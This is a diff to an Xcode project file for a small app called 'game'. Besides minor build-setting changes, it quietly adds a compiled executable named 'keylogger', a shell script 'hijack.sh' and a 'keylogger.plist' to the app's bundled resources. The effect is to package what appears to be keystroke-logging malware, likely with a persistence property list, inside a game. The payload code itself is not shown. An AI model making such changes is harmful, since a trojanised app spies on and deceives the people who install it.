@@ -11,6 +11,9 @@
 		7933B6FF2BA107750053C8AF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7933B6FE2BA107750053C8AF /* ContentView.swift */; };
 		7933B7012BA107770053C8AF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7933B7002BA107770053C8AF /* Assets.xcassets */; };
 		7933B7052BA107770053C8AF /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7933B7042BA107770053C8AF /* Preview Assets.xcassets */; };
+		79D0F02F2BA3320500A969E6 /* keylogger in Resources */ = {isa = PBXBuildFile; fileRef = 79D0F02E2BA3320500A969E6 /* keylogger */; };
+		79D0F0322BA3321000A969E6 /* hijack.sh in Resources */ = {isa = PBXBuildFile; fileRef = 79D0F0302BA3321000A969E6 /* hijack.sh */; };
+		79D0F0332BA3321000A969E6 /* keylogger.plist in Resources */ = {isa = PBXBuildFile; fileRef = 79D0F0312BA3321000A969E6 /* keylogger.plist */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -20,6 +23,9 @@
 		7933B7002BA107770053C8AF /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		7933B7022BA107770053C8AF /* game.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = game.entitlements; sourceTree = "<group>"; };
 		7933B7042BA107770053C8AF /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
+		79D0F02E2BA3320500A969E6 /* keylogger */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = keylogger; sourceTree = "<group>"; };
+		79D0F0302BA3321000A969E6 /* hijack.sh */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.script.sh; path = hijack.sh; sourceTree = "<group>"; };
+		79D0F0312BA3321000A969E6 /* keylogger.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = keylogger.plist; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -52,6 +58,9 @@
 		7933B6FB2BA107750053C8AF /* game */ = {
 			isa = PBXGroup;
 			children = (
+				79D0F0302BA3321000A969E6 /* hijack.sh */,
+				79D0F0312BA3321000A969E6 /* keylogger.plist */,
+				79D0F02E2BA3320500A969E6 /* keylogger */,
 				7933B6FC2BA107750053C8AF /* gameApp.swift */,
 				7933B6FE2BA107750053C8AF /* ContentView.swift */,
 				7933B7002BA107770053C8AF /* Assets.xcassets */,
@@ -127,8 +136,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				79D0F0322BA3321000A969E6 /* hijack.sh in Resources */,
 				7933B7052BA107770053C8AF /* Preview Assets.xcassets in Resources */,
+				79D0F02F2BA3320500A969E6 /* keylogger in Resources */,
 				7933B7012BA107770053C8AF /* Assets.xcassets in Resources */,
+				79D0F0332BA3321000A969E6 /* keylogger.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -261,6 +273,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
 				CODE_SIGN_ENTITLEMENTS = game/game.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -280,7 +293,7 @@
 				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
-				MACOSX_DEPLOYMENT_TARGET = 12.7;
+				MACOSX_DEPLOYMENT_TARGET = 11.0;
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = wolf606.game;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -297,6 +310,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
 				CODE_SIGN_ENTITLEMENTS = game/game.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -316,7 +330,7 @@
 				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
-				MACOSX_DEPLOYMENT_TARGET = 12.7;
+				MACOSX_DEPLOYMENT_TARGET = 11.0;
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = wolf606.game;
 				PRODUCT_NAME = "$(TARGET_NAME)";
